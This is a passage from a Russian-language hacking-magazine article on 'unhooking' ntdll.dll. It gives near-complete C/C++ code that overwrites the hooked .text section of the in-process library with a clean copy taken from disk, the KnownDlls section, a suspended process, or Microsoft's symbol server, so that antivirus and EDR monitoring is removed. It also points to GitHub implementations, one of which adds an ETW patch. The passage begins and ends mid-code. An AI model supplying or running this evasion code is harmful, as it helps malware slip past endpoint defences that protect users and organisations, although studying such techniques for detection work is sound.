    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

Больше все го нас интересуют элемен ты DllBase и FullDllName, у которых
внутри базовый адрес загрузки библиотеки и ее имя соответс твенно. Поэто-
му пред лагаю пробежаться по это му списку, обнаружить элемент, у которого
FullDllName рав но C:\Windows\\System32\ntdll.dll, и вычленить его
DllBase.


#include <winternl.h>
#include <algorithm>
#include <string>


...


PVOID FetchLocalNtdllBaseAddress() {
    // Достаем TEB (это как PEB, только для потока)
    PTEB teb = static_cast<PTEB>(NtCurrentTeb());
    // ИЗ TEB получаем PEB
    PPEB peb = teb->ProcessEnvironmentBlock;
    // Голова списка — верхний элемент. Просто по нему будем
отслеживать, пробежались ли мы по всему списку или нет
    PLIST_ENTRY listHead = &peb->Ldr->InMemoryOrderModuleList;
    // Следующий за головой элемент
    PLIST_ENTRY listEntry = listHead->Flink;


    ULONG addr = 0X0;
    while (listEntry != listHead)
    {
        PLDR_DATA_TABLE_ENTRY ldrEntry = CONTAINING_RECORD(listEntry,
LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        std::wstring dllName = ldrEntry->FullDllName.Buffer;
        std::transform(dllName.begin(), dllName.end(), dllName.begin
(), ::tolower);


        if (dllName.find(L"c:\\windows\\system32\\ntdll.dll") != std:
:wstring::npos) {
            return ldrEntry->DllBase;
        }


        listEntry = listEntry->Flink;
    }
    return (PVOID)addr;
}





            Успешное получение адреса хукнутой библиотеки

Осталось всего ничего — вычленяем адреса сек ций .text и заменяем одну
сек цию другой! Причем опять есть два варианта получе ния этой сек ции.
Можем пойти через  Optional Header  (IMAGE_OPTIONAL_HEADER),  внутри
которого содержится RVA-адрес секции .text, элемент BaseOfCode, либо
через IMAGE_SECTION_HEADER, пытаясь обнаружить секцию с именем .text.


PIMAGE_DOS_HEADER   pLocalDosHdr    = (PIMAGE_DOS_HEADER)pLocalNtdll;
if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    return FALSE;


PIMAGE_NT_HEADERS   pLocalNtHdrs    = (PIMAGE_NT_HEADERS)((PBYTE)
pLocalNtdll + pLocalDosHdr->e_lfanew);
if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
    return FALSE;


PVOID   pLocalNtdllTxt  = (PVOID)(pLocalNtHdrs->OptionalHeader.
BaseOfCode + (ULONG_PTR)pLocalNtdll);
SIZE_T  sNtdllTxtSize   = pLocalNtHdrs->OptionalHeader.SizeOfCode;

 • pLocalNtdll — базовый адрес ntdll.dll, получен ный ранее;
 • pLocalNtdllTxt — адрес сек ции .text;
 • sNtdllTxtSize — размер сек ции.


    PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
    PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll
;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;


    PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)
pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(
pLocalNtHdrs);


    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i
++) {


        if( strcmp(pSectionHeader[i]->Name, ".text") == 0) ) {
            PVOID pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll +
pSectionHeader[i].VirtualAddress);
            SIZE_T sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize
;
            break;
        }
    }

При чем во втором варианте мы могли бы избежать исполь зования функции
strcmp сле дующим усло вием:


if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

Сна чала выраже ние *(ULONG*) приводит к тому, что имя .text преобразует-
ся в xet. , так как млад ший байт будет про читан первым и помещен в стар-
шую позицию значения ULONG, а самый стар ший байт будет про читан пос-
ледним и помещен пос ледним. Далее выполняет ся побитовое ИЛИ для
вырав нивания полученного значения по 32-битной границе. И наконец, про-
исхо дит срав нение.
  Остается лишь перезаписать одну секцию .text другой. Для этого можно
использовать стандар тный memcpy(). Предлагаю так же свести в отдельную
функцию, которой достаточно лишь передачи базового адреса нехукнутой
ntdll.


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll /*адрес
нехукнутой ntdll в памяти*/) {


    // Базовый адрес загрузки хукнутой ntdll.dll
    PVOID pLocalNtdll;
    pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();


    // Получаем заголовок dos
    PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll
;
    if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;


    PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)
pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    PVOID       pLocalNtdllTxt = NULL,  // Адрес секции .text
хукнутой либы
        pRemoteNtdllTxt = NULL; // Адрес секции .text анхукнутой либы
    SIZE_T      sNtdllTxtSize = NULL; // Размер секции .text



    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(
pLocalNtHdrs);


    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i
++) {


        //  if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.')
{


            // Получаем адрес секции .text хукнутой ntdll.dll
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll +
pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
pSectionHeader[i].VirtualAddress);
#endif
#ifdef READ_NTDLL
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
1024);
            if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
{


                pRemoteNtdllTxt = (PVOID)((char*)pRemoteNtdllTxt +
3072);


                if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)
pRemoteNtdllTxt)
                    return FALSE;
            }
#endif
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }



    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;


    DWORD dwOldProtection = NULL;


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[!] VirtualProtect [1] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    return TRUE;
}

Думаю, у тебя появились воп росы по поводу следующе го участка кода:


        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.')
{


            // Получаем адрес секции .text хукнутой ntdll.dll
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll +
pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
pSectionHeader[i].VirtualAddress);
#endif
#ifdef READ_NTDLL
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
1024);
            if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
{


                pRemoteNtdllTxt = (PVOID)((char*)pRemoteNtdllTxt +
3072);


                if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)
pRemoteNtdllTxt)
                    return FALSE;
            }
#endif
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

Сме щение сек ции .text различается в зависи мости от того, каким образом
мы  считываем    ntdll.dll  с  диска.  Если  мы  счи тываем  ее  через
CreateFileMapping(), то смещение всег да будет таким:


pSectionHeader[i].VirtualAddress

Ес ли же счи тывать через ReadFile(), то иногда вый дет 1024, а иногда 4096.
Най ти закономерности не получилось, поэтому сна чала мы добавляем сме-
щение 1024, проверяем, соответству ют ли байты по этому адре су бай там
оригиналь ной, хук нутой ntdll. Если не соот ветству ют, значит, оффсет 4096,
но мы уже при бави ли 1024, поэто му добав ляем 3072. И вновь проводим про-
верку.
  В результате чего мы сможем без проблем заменить одну библиотеку дру-
гой, что поз волит снять хук. Полный код — в мо ем репозитории. Есть похожая
реали зация TheD1rkMtr, он добавил еще и патч от ETW.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                   ПОЗНАЕМ АНХУКИНГ NTDLL.DLL





ÑÍßÒÈÅ ÕÓÊÀ ×ÅÐÅÇ KNOWNDLLS

KnownDlls — специальный раздел в реестре, где содержатся DLL, которые
загрузчик Windows использует для оптимиза ции про цес са загрузки приложе-
ний. В Windows XP и более ран них версиях каталог KnownDlls рас полагался
в пап ке C:\Windows\System32. В более новых вер сиях Windows этот каталог
встро ен в ОС, поэтому пря мого дос тупа к нему нет. Список всех «извес тных»
DLL можно найти вот в этом раз деле реес тра:


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\
KnownDLLs

Из влечь биб лиоте ку  возможно  с помощью функции NtOpenSection(),
по неиз вестным при чинам использование OpenFileMapping() при водит
к ошибке ERROR_BAD_PATHNAME. Прототип у функции следующий.


NTSTATUS NtOpenSection(
  OUT PHANDLE             SectionHandle,
  IN  ACCESS_MASK         DesiredAccess,
  IN  POBJECT_ATTRIBUTES  ObjectAttributes
);

Об рати внимание на пос ледний параметр — ObjectAttributes. Его нужно
инициализировать с помощью функции InitializeObjectAttributes().


VOID InitializeObjectAttributes(
  [out]          POBJECT_ATTRIBUTES   p,
  [in]           PUNICODE_STRING      n,
  [in]           ULONG                a,
  [in]           HANDLE               r,  // NULL
  [in, optional] PSECURITY_DESCRIPTOR s   // NULL
);

 • p — указатель на струк туру OBJECT_ATTRIBUTES;
 • n — указатель на струк туру UNICODE_STRING, которая будет содер жать
  имя ntdll.dll из KnownDll;
 • s — устанав ливаем значение в OBJ_CASE_INSENSITIVE .


UNICODE_STRING.Buffer = (PWSTR)L"\KnownDlls\ntdll.dll";
UNICODE_STRING.Length = wcslen(L"\KnownDlls\ntdll.dll") * sizeof(
WCHAR);
UNICODE_STRING.MaximumLength = UniStr.Length + sizeof(WCHAR);

Те перь мы сможем без проб лем передать ини циализированный объект
в функцию NtOpenSection(), а затем отразить ntdll.dll на адресное прос-
транство текуще го процесса через ранее описан ный MapViewOfFile().
Предлагаю вновь свести всё до функции, воз вра щающей адрес, по которому
библиотека спроецирована в память.


#include <winternl.h>
#define NTDLL   L"\\KnownDlls\\ntdll.dll"


typedef NTSTATUS (NTAPI* fnNtOpenSection)(
PHANDLE               SectionHandle,
ACCESS_MASK           DesiredAccess,
POBJECT_ATTRIBUTES    ObjectAttributes
);



BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {


    HANDLE              hSection = NULL;
    PBYTE               pNtdllBuffer = NULL;
    NTSTATUS                STATUS = NULL;
    UNICODE_STRING          UniStr = { 0 };
    OBJECT_ATTRIBUTES   ObjAtr = { 0 };


    UniStr.Buffer = (PWSTR)NTDLL;
    UniStr.Length = wcslen(NTDLL) * sizeof(WCHAR);
    UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);


    InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE
, NULL, NULL);


    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(
GetModuleHandle(L"NTDLL"), "NtOpenSection");


    STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ, &ObjAtr);
    if (STATUS != 0x00) {
        printf("[!] NtOpenSection Failed With Error : 0x%0.8X \n",
STATUS);
        goto _EndOfFunc;
    }


    pNtdllBuffer = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, NULL
, NULL, NULL);
    if (pNtdllBuffer == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    *ppNtdllBuf = pNtdllBuffer;


_EndOfFunc:
    if (hSection)
        CloseHandle(hSection);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;
}

Пос ле получения адре са проверяем, что там действительно находится наша
библиотека.





         Проецирование через MapViewOfFile + NtOpenSection

Остает ся лишь так же грамотно распарсить PE и заменить одну секцию .text
другой. Здесь все про ще, чем при чтении с дис ка. Всегда будет одинако вое
сме щение, рав ное 4096.


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {


    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();


    PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll
;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;


    PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)
pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    PVOID       pLocalNtdllTxt = NULL,
        pRemoteNtdllTxt = NULL;
    SIZE_T      sNtdllTxtSize = NULL;


    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(
pLocalNtHdrs);


    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i
++) {


        // if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.')
{
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll +
pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }


    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;


    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
        return FALSE;


    DWORD dwOldProtection = NULL;


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        printf("[!] VirtualProtect [1] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);


    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize,
dwOldProtection, &dwOldProtection)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n",
GetLastError());
        return FALSE;
    }


    return TRUE;
}

Код буквально скопирован из предыдущей части статьи. Разве что теперь
оффсет всег да один и тот же. Для чистоты эксперимента можем проверить,
что дей ствительно копируется одна секция .text на другую.





                  Что хранится по адресу pLocalNtdllTxt





                 Что хранит ся по адре су pRemoteNtdllTxt

Пол ный код я выложил на GitHub. И опять же у нашего дру га TheD1rkMtr есть
своя реали зация этого метода.
   Здесь есть одна особенность, о которой важ но знать: ты дол жен исполь-
зовать 64-битную программу на 64-битной системе. Если запускать прог-
рамму для х86 на системе x86-64, то в процес се будет находиться ntdll.dll
для х86, а из KnownDll прилетит DLL для x86-64, что при перезаписи при ведет
к крашу.





                      x86 ntdll в программе для x86





                А мы пытаемся подменить на x86-64


ÑÍßÒÈÅ ÕÓÊÀ ×ÅÐÅÇ ÏÐÈÎÑÒÀÍÎÂËÅÍÍÛÉ ÏÐÎÖÅÑÑ

Любой процесс в Windows можно запустить в при остановленном сос тоянии.
Для  это го  достаточно  передать  в  функцию  CreateProcess()  флаг
CREATE_SUSPENDED либо DEBUG_PROCESS. Причем в таком сос тоянии в про-
цесс будет под гружена толь ко ntdll.dll.





                     Одна библиотека

Затем,  возобновляя  основной   поток  про цесса,  например  через
ResumeThread(), подтягиваем в него оставши еся биб лиотеки.





               Под клю чение недостающих библиотек

Ты можешь проверить это самостоятельно с помощью простого кода.


#include <windows.h>
#include <iostream>


int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;


    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)
        ) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ")
.\n";
        return -1;
    }


    std::cout << "The process is created in suspended state.\n";
    getchar();


    if (ResumeThread(pi.hThread) == -1) {
        std::cerr << "ResumeThread failed (" << GetLastError() << ").
\n";
        return -1;
    }


    getchar();
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);


    return 0;
}

В биб лиоте ке  ntdll.dll, которая находится в приостановленном процес се,
могут отсутствовать хуки по той причине, что оставшиеся DLL, в том числе
анти вирусные, банально не подгрузились. Конечно, такое поведе ние встре-
чается все реже и реже, но о нем не сто ит забывать совсем.
  Поэто му оста ется лишь получить базовый адрес загрузки этой  ntdll.dll,
достать его, а затем скопировать секцию .text на ntdll.dll своего процес са.
Единственная загвоз дка — для копирования секции .text требуется знать ее
раз мер. Дос тать, конеч но же, можно и через парсинг PE. Предлагаю свес ти
всё до отдельной функции, которой нужно передать базовый адрес биб-
лиотеки, а она вер нет ее размер.


SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {


    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;


    return pImgNtHdrs->OptionalHeader.SizeOfImage;
}

Остает ся все го ничего — прочитать память процес са, который мы запус тили
в приостанов ленном состоянии. Опять же реали зуем отдельную функцию,
которая вер нет адрес ntdll.dll.


BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT
PVOID* ppNtdllBuf) {


    CHAR    cWinPath[MAX_PATH / 2] = { 0 };
    CHAR    cProcessPath[MAX_PATH] = { 0 };


    PVOID   pNtdllModule = FetchLocalNtdllBaseAddress();
    PBYTE   pNtdllBuffer = NULL;
    SIZE_T  sNtdllSize = NULL,
        sNumberOfBytesRead = NULL;


    STARTUPINFOA                    Si = { 0 };
    PROCESS_INFORMATION            Pi = { 0 };


    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


    Si.cb = sizeof(STARTUPINFO);


    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    sprintf_s(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s",
cWinPath, lpProcessName);


    if (!CreateProcessA(
        NULL,
        cProcessPath,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &Si,
        &Pi)) {
        printf("[!] CreateProcessA Failed with Error : %d \n",
GetLastError());
        goto _EndOfFunc;
    }


    sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
    if (!sNtdllSize)
        goto _EndOfFunc;
    pNtdllBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
HEAP_ZERO_MEMORY, sNtdllSize);
    if (!pNtdllBuffer)
        goto _EndOfFunc;


    if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer,
sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize)
{
        printf("[!] ReadProcessMemory Failed with Error : %d \n",
GetLastError());
        printf("[i] Read %d of %d Bytes \n", sNumberOfBytesRead,
sNtdllSize);
        goto _EndOfFunc;
    }


    *ppNtdllBuf = pNtdllBuffer;



    if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi
.hProcess, 0)) {
        // Дополнительно здесь можно дернуть TerminateProcess()
    }



_EndOfFunc:
    if (Pi.hProcess)
        CloseHandle(Pi.hProcess);
    if (Pi.hThread)
        CloseHandle(Pi.hThread);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;


}

Оф фсет в таком случае будет стандартный — 4096.





                  Про верка корректнос ти чтения

Как всег да, на GitHub можешь посмотреть исходники моей реализации и ре-
ализации TheD1rkMtr.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                   ПОЗНАЕМ АНХУКИНГ NTDLL.DLL





ÑÍßÒÈÅ ÕÓÊÀ ×ÅÐÅÇ ÏÎÄÃÐÓÇÊÓ NTDLL.DLL Ñ ÓÄÀËÅÍÍÎÃÎ ÂÅÁ-
ÑÅÐÂÅÐÀ

Думаю, это самый инте ресный способ. Он основан на том, что есть прек-
расный сайт winbindex.m417z.com, где при ведены ссылки на  ntdll.dll прак-
тически для любой вер сии Windows.





                           Сайт с ntdll.dll

Нам остается лишь разобраться, как генери руют ся ссылки. С ходу этого сде-
лать не получи лось. Пред последняя часть URL — не более чем непонятный
набор символов.


...dll/283EB25D1ef000/ntdll...
...dll/54219A10209000/ntdll...

Вручную переб рав все ссылки с первой страницы (не на питоне же автомати-
зировать, в самом деле, мы ведь серьезные люди), заметил, что у двух ссы лок
есть повторяющиеся в конце шесть символов.


...dll/2451EFDD1af000/ntdll...





                    Повторяющиеся символы 1


...dll/4028FADC1af000/ntdll...





                    Повторяющиеся символы 2

Научен ный горьким опытом решения сте ганографичес кого чуда на CTF, мой
вос паленный мозг понимает,  что это зацепка. Копируем эти символы
и начина ем искать. Обна руживаем интересную кнопку Show, которая поз-
воля ет получить больше информа ции о фай ле. Наш 1af000 нигде не встре-
чается, но поп робуем конвертировать из HEX в десятичное значение. И фор-
туна пос мотрела в нашу сторону! Это оказал ся параметр virtualSize.





              Об наружение смысла вто рой части

Выч леняем пер вую часть, также конвертируем ее в десятичное значение
и узнаем, что это timestamp.





              Обнаружение смыс ла первой части

Остает ся лишь додумать ся, как получить эти данные. У ntdll.dll тоже обычный
PE, поэтому сто ит глядеть именно в эту сто рону. Временную метку получится
извлечь из струк туры IMAGE_FILE_HEADER.





                     Откуда брать timestamp

А    размер    получа ем    из    элемента   SizeOfImage    структуры
IMAGE_OPTIONAL_HEADER.





                      Откуда брать размер

Есть еще SizeOfCode, но это размер непосредственно кодовой части. Я
подозреваю, что секции .text, поэтому она нам не подходит. Нужен размер
все го образа фай ла ntdll.dll.
  Поэто му остается лишь запрашивать эту информацию из системы, а затем
генери ровать URL определен ного вида.


https://msdl.microsoft.com/download/symbols/ntdll.dll/`strconcat( hex(
IMAGE_FILE_HEADER TimeStamp) , hex(IMAGE_OPTIONAL_HEADER SizeOfImage))
`/ntdll.dll

Пос ле чего, исполь зуя WinHTTP, качаем нужную биб лиотеку и внедряем
в свое адресное прос транс тво ее сек цию .text взамен хукнутой. Алгоритм
получе ния биб лиотеки с сервера тоже укладыва ется в одну маленькую фун-
кцию.


#include <algorithm>
#include <string>
#define FIXED_URL   L"https://msdl.microsoft.com/download/symbols/
ntdll.dll/"


BOOL ReadNtdllFromServer(OUT PVOID* ppNtdllBuf) {


    PBYTE      pNtdllModule             = (PBYTE)
FetchLocalNtdllBaseAddress();
    PVOID      pNtdllBuffer             = NULL;
    SIZE_T     sNtdllSize               = NULL;
    WCHAR      szFullUrl [MAX_PATH]     = { 0 };


    // Получаем параметры хукнутой ntdll.dll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;


    // Качаем нехукнутую ntdll.dll
    wsprintfW(szFullUrl, L"%s%0.8X%0.4X/ntdll.dll", FIXED_URL,
pImgNtHdrs->FileHeader.TimeDateStamp, pImgNtHdrs->OptionalHeader.
SizeOfImage);


    if (!GetPayloadFromUrl(szFullUrl, &pNtdllBuffer, &sNtdllSize))
        return FALSE;


    *ppNtdllBuf = pNtdllBuffer;


    return TRUE;
}

Отдельно я вынес функцию GetPayloadFromUrl(), которая принимает URL
для скачивания ntdll.dll, а возвращает указатель на адрес в памяти, где
будет лежать либа размером sNtdllSize.


BOOL GetPayloadFromUrl(IN LPCWSTR szUrl, OUT PVOID* pNtdllBuffer, OUT
PSIZE_T sNtdllSize) {


    BOOL        bSTATE          = TRUE;
    HINTERNET   hInternet       = NULL,
                hInternetFile   = NULL;
    DWORD       dwBytesRead     = NULL;
    SIZE_T      sSize           = NULL;
    PBYTE       pBytes          = NULL,
                pTmpBytes       = NULL;


    hInternet = InternetOpenW(L"info", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n",
GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL,
INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
NULL);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n",
GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }


    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &
dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n",
GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }


        sSize += dwBytesRead;


        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE
| LMEM_ZEROINIT);


        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes,
dwBytesRead);


        memset(pTmpBytes, '\0', dwBytesRead);
        if (dwBytesRead < 1024) {
            break;
        }


    }


    *pNtdllBuffer   = pBytes;
    *sNtdllSize     = sSize;


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED,
NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}

Фун кция  откры вает  интернет-сес сию,  пос ле  чего  читает  кус ки  раз-
мером 1024 бай та до тех пор, пока не будет считано меньше 1024 байтов.
Если счи тано меньше 1024 байт, значит, весь файл был успешно передан
и мож но закрывать сессию.
  Нес мотря на то что нехукнутая ntdll.dll будет считываться с веб-сервера,
оффсет сек ции .text невоз можно знать заранее. Он то 1024, то 4096.
Поэтому исполь зуем код из раздела с чтением биб лиотеки из дис ка — будем
опять проверять начальные байты по оффсету 1024, если совпадут, то
копируем по это му адресу, если нет, то добавляем 3072.


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {


    PVOID   pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();


    PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll
;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;


    PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)
pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    PVOID     pLocalNtdllTxt = NULL,
        pRemoteNtdllTxt = NULL;
    SIZE_T    sNtdllTxtSize = NULL;


    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(
pLocalNtHdrs);


    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i
++) {


        // if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.')
{


            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll +
pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
1024);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }
    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;


    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
        pRemoteNtdllTxt = (PVOID)((char*)pRemoteNtdllTxt + 3072);
        if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
